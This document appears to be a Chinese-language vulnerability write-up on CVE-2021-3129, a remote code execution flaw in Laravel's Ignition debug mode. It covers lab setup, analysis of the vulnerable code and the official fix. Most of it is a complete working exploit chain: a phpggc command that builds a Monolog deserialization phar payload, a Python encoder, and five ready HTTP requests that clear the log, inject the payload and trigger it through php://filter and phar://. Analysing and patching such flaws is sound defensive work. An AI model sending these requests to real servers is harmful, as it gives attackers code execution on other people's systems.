# laravel

## Laravel debug模式远程代码执行漏洞(CVE-2021-3129)

### 靶场搭建
```
$ git clone https://github.com/laravel/laravel.git
$ cd laravel
$ git checkout e849812
$ composer install
$ composer require facade/ignition==2.5.1
$ php artisan serve
```

在项目目录/config/app.php文件中
开启debug模式
```'debug' => (bool) env('APP_DEBUG', true)```

将项目目录下/.env.example 重命名为 .env

访问启动的web界面，返回如下：
![avatar](../../../images/php/laravel/CVE-2021-3129/1.png)
点击Generate app key，就会在.env文件里生成一条APP_KEY

生成成功后刷新页面，返回如下：
![avatar](../../../images/php/laravel/CVE-2021-3129/2.png)
环境搭建成功

### 漏洞分析
#### 利用条件
1.Laravel开启Debug模式（默认不开启）

2.phar.readonly = off(默认为On)

#### 代码分析
Laravel 6版本之后，在debug模式下使用Ignition处理程序报错信息。Ignition除了显示漂亮的堆栈跟踪以外，还提供了解决方案，帮助解决开发应用程序时可能会遇到的问题。

举个例子：

1. 在laravel/resources/views/目录下创建一个test.blade.php文件内容为
```php
<html>
    <body>
        <h1>Hello, {{ $name }}</h1>
    </body>
</html>
```
2. 在laravel/routes/web.php中，添加一条路由
```php
Route::get('/test', function () {
    return view('test');
});
```
3. 访问http://localhost/test 页面报错，可以看到Ignition给出了解决方案
![avatar](../../../images/php/laravel/CVE-2021-3129/16.png)

4. 点击Make variable optional执行解决方案
```http
	POST /_ignition/execute-solution HTTP/1.1
	Host: localhost
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
	Accept: application/json
	Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
	Accept-Encoding: gzip, deflate
	Referer: http://localhost/test
	Content-Type: application/json
	Origin: http://localhost
	Content-Length: 192
	Connection: keep-alive

	{
	 	"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
	 	"parameters":{
	 		"variableName":"name",
	 		"viewFile":"D:\\phpstudy_pro\\laravel-8.4.1\\resources\\views\\test.blade.php"
	 	}
	}
```

根据数据包的内容，我们在代码中寻找MakeViewVariableOptionalSolution，看看它具体做了什么

在laravel/vendor/facade/ignition/src/Solutions/MakeViewVariableOptionalSolution.php中(代码已简化)
```php
class MakeViewVariableOptionalSolution implements RunnableSolution
{
    private $variableName;
    private $viewFile;

    public function __construct($variableName = null, $viewFile = null)
    {
        $this->variableName = $variableName;
        $this->viewFile = $viewFile;
    }

    public function run(array $parameters = [])
    {
        $output = $this->makeOptional($parameters);
        if ($output !== false) {
            file_put_contents($parameters['viewFile'], $output);
        }
    }

    protected function isSafePath(string $path): bool
    {
        if (! Str::startsWith($path, ['/', './'])) {
            return false;
        }
        if (! Str::endsWith($path, '.blade.php')) {
            return false;
        }

        return true;
    }

    public function makeOptional(array $parameters = [])
    {
/*        if (! $this->isSafePath($parameters['viewFile'])) {
            return false;
        }*/

        $originalContents = file_get_contents($parameters['viewFile']);
        $newContents = str_replace('$'.$parameters['variableName'], '$'.$parameters['variableName']." ?? ''", $originalContents);

        $originalTokens = token_get_all(Blade::compileString($originalContents));
        $newTokens = token_get_all(Blade::compileString($newContents));

        $expectedTokens = $this->generateExpectedTokens($originalTokens, $parameters['variableName']);

        if ($expectedTokens !== $newTokens) {
            return false;
        }

        return $newContents;
    }

    protected function generateExpectedTokens(array $originalTokens, string $variableName): array
    {
        $expectedTokens = [];
        foreach ($originalTokens as $token) {
            $expectedTokens[] = $token;
            if ($token[0] === T_VARIABLE && $token[1] === '$'.$variableName) {
                $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]];
                $expectedTokens[] = [T_COALESCE, '??', $token[2]];
                $expectedTokens[] = [T_WHITESPACE, ' ', $token[2]];
                $expectedTokens[] = [T_CONSTANT_ENCAPSED_STRING, "''", $token[2]];
            }
        }

        return $expectedTokens;
    }
}
```
makeOptional方法通过file_get_contents读取viewFile参数传入的文件，对内容进行替换后，返回$newContents给Run方法，Run方法再通过file_put_contents将$newContents写入viewFile参数传入的文件。

调用解决方案的入口：laravel/src/Http/Controllers/ExecuteSolutionController.php，在这里调用了MakeViewVariableOptionalSolution的run方法。

```php
class ExecuteSolutionController
{
    use ValidatesRequests;

    public function __invoke(
        ExecuteSolutionRequest $request,
        SolutionProviderRepository $solutionProviderRepository
    ) {
        $solution = $request->getRunnableSolution();

        $solution->run($request->get('parameters', []));

        return response('');
    }
}
```

漏洞作者的思路则是，在这一读一写之间，通过php://filter，将Laravel的log文件改造成phar文件，然后通过phar://协议触发反序列化。

通过php://filter清空log文件 ——> 通过报错信息写入payload ——> 通过php://filter将payload还原回phar格式，并消除多余字符 ——> 通过phar://触发反序列化，执行代码。

首先通过convert.base64-decode消除不符合base64格式的字符

通过观察报错信息，可以发现我们注入的payload出现了两次，但我们只需要一个payload，如何消除第二个payload的影响？

![avatar](../../../images/php/laravel/CVE-2021-3129/17.png)

针对这个问题，原作者使用convert.iconv.utf16le.utf-8来处理payload，由于UTF-16为两字节存储，我们可以在payload后面加上一位字符，使第二个payload无法被转换器识别，从而消除第二个payload
比如在
```
=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00
```
后面加上个a
```
=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00a
```

为了保证读到payload时一定是完整的两字节，我们需要先写入一个payload_A进行对齐操作
```
"viewFile": "AA"
```

最后一个问题：当我们使用空字符将payload填充至2字节后，PHP会在读到空字符时报错。我们可以将空字符替换为=00，通过convert.quoted-printable-decode还原回空字符。因此构造payload时需要将每个字符转16进制，同时前面加一个"="，如 "P" -> "=50" 
原作者的最终处理方式：
```
php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log
```
先知社区的一篇文章给出的转换流程：
```
php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log
```

#### 过滤器拆分：
为了方便直观得看到每一步payload的变化，这里贴出转换过程

1.清空过程：

convert.iconv.utf-8.utf-16be

![avatar](../../../images/php/laravel/CVE-2021-3129/10.png)
convert.quoted-printable-encode

![avatar](../../../images/php/laravel/CVE-2021-3129/11.png)
convert.iconv.utf-16be.utf-8

![avatar](../../../images/php/laravel/CVE-2021-3129/12.png)

convert.base64-decode

内容清空

2.payload转换至phar格式过程：

convert.quoted-printable-decode

![avatar](../../../images/php/laravel/CVE-2021-3129/13.png)

convert.iconv.utf-16le.utf-8

![avatar](../../../images/php/laravel/CVE-2021-3129/14.png)

convert.base64-decode

![avatar](../../../images/php/laravel/CVE-2021-3129/15.png)
### 漏洞修复
1.升级Ignition到2.5.2版本。

2.或在MakeViewVariableOptionalSolution.php文件中makeOptional函数开头添加
```php
if (! $this->isSafePath($parameters['viewFile'])) {
    return false;
}
```
在makeOptional函数上面添加
```php
protected function isSafePath(string $path): bool
{
    if (! Str::startsWith($path, ['/', './'])) {
        return false;
    }
    if (! Str::endsWith($path, '.blade.php')) {
        return false;
    }

    return true;
}
```
https://github.com/facade/ignition/pull/334
### 漏洞利用
1.安装phpggc
```
git clone https://github.com/ambionics/phpggc.git
```

2.选择Gadget
```
./phpggc -l 
```
可以选择Laravel和Monolog的Gadget Chains
![avatar](../../../images/php/laravel/CVE-2021-3129/7.png)
3.生成phar payload
```
php -d'phar.readonly=0' ./phpggc monolog/rce1 call_user_func phpinfo --phar phar -o php://output | base64 -w0
```
![avatar](../../../images/php/laravel/CVE-2021-3129/8.png)
4.生成payload
```python
s='PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQrTAgAAAgAAABEAAAABAAAAAAB8AgAATzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7TzoyOToiTW9ub2xvZ1xIYW5kbGVyXEJ1ZmZlckhhbmRsZXIiOjc6e3M6MTA6IgAqAGhhbmRsZXIiO047czoxMzoiACoAYnVmZmVyU2l6ZSI7aTotMTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czoxMDoiZGV3ZjYzQmEyZCI7czo1OiJsZXZlbCI7Tjt9fXM6ODoiACoAbGV2ZWwiO047czoxNDoiACoAaW5pdGlhbGl6ZWQiO2I6MTtzOjE0OiIAKgBidWZmZXJMaW1pdCI7aTotMTtzOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjc6ImN1cnJlbnQiO2k6MTtzOjg6InZhcl9kdW1wIjt9fXM6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MTA6ImRld2Y2M0JhMmQiO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo4OiJ2YXJfZHVtcCI7fX19BQAAAGR1bW15BAAAANGEBmAEAAAADH5/2KQBAAAAAAAACAAAAHRlc3QudHh0BAAAANGEBmAEAAAADH5/2KQBAAAAAAAAdGVzdHRlc3SEEtfAWxWZrwQjhfQm+23JVq2wlgIAAABHQk1C'
''.join(["="+hex(ord(i))[2:] + "=00" for i in s]).upper()
```
![avatar](../../../images/php/laravel/CVE-2021-3129/9.png)
5.清空日志内容
```http
POST /_ignition/execute-solution HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Content-Type: application/json
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Length: 338

{
   "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
   "parameters": {
       "variableName": "username",
       "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
	}
}
```
![avatar](../../../images/php/laravel/CVE-2021-3129/3.png)
6.对齐
```http
POST /_ignition/execute-solution HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Content-Type: application/json
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Length: 173

{
   "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
   "parameters": {
       "variableName": "username",
       "viewFile": "AA"
    }
}

```
![avatar](../../../images/php/laravel/CVE-2021-3129/4.png)
![avatar](../../../images/php/laravel/CVE-2021-3129/5.png)
7.加入payload
```http
POST /_ignition/execute-solution HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Content-Type: application/json
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Length: 8692

{
   "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
   "parameters": {
       "variableName": "username",
       "viewFile": "=50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=72=00=54=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=38=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=5A=00=47=00=56=00=33=00=5A=00=6A=00=59=00=7A=00=51=00=6D=00=45=00=79=00=5A=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=67=00=36=00=49=00=6E=00=5A=00=68=00=63=00=6C=00=39=00=6B=00=64=00=57=00=31=00=77=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6C=00=4E=00=70=00=65=00=6D=00=55=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=6D=00=52=00=6C=00=64=00=32=00=59=00=32=00=4D=00=30=00=4A=00=68=00=4D=00=6D=00=51=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=54=00=6F=00=69=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=66=00=58=00=31=00=7A=00=4F=00=6A=00=67=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=6C=00=75=00=61=00=58=00=52=00=70=00=59=00=57=00=78=00=70=00=65=00=6D=00=56=00=6B=00=49=00=6A=00=74=00=69=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=54=00=47=00=6C=00=74=00=61=00=58=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=48=00=4A=00=76=00=59=00=32=00=56=00=7A=00=63=00=32=00=39=00=79=00=63=00=79=00=49=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=33=00=4F=00=69=00=4A=00=6A=00=64=00=58=00=4A=00=79=00=5A=00=57=00=35=00=30=00=49=00=6A=00=74=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=4A=00=32=00=59=00=58=00=4A=00=66=00=5A=00=48=00=56=00=74=00=63=00=43=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=4E=00=47=00=45=00=42=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=4E=00=47=00=45=00=42=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=53=00=45=00=45=00=74=00=66=00=41=00=57=00=78=00=57=00=5A=00=72=00=77=00=51=00=6A=00=68=00=66=00=51=00=6D=00=2B=00=32=00=33=00=4A=00=56=00=71=00=32=00=77=00=6C=00=67=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a"
    }
}
```
8.去除多余字符，将payload转换成phar格式
```http
POST /_ignition/execute-solution HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Content-Type: application/json
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Length: 309

{
   "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
   "parameters": {
       "variableName": "username",
       "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode|convert.base64-decode/resource=../storage/logs/laravel.log"
    }
}
```
9.使用phar://解压缩laravel.log触发反序列化，执行payload
```http
POST /_ignition/execute-solution HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Content-Type: application/json
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Length: 235

{
   "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
   "parameters": {
       "variableName": "username",
       "viewFile": "phar://D:/phpstudy_pro/laravel/storage/logs/laravel.log/test.txt"
    }
}
```
![avatar](../../../images/php/laravel/CVE-2021-3129/6.png)
### PSF案例
![avatar](../../../images/php/laravel/CVE-2021-3129/18.png)


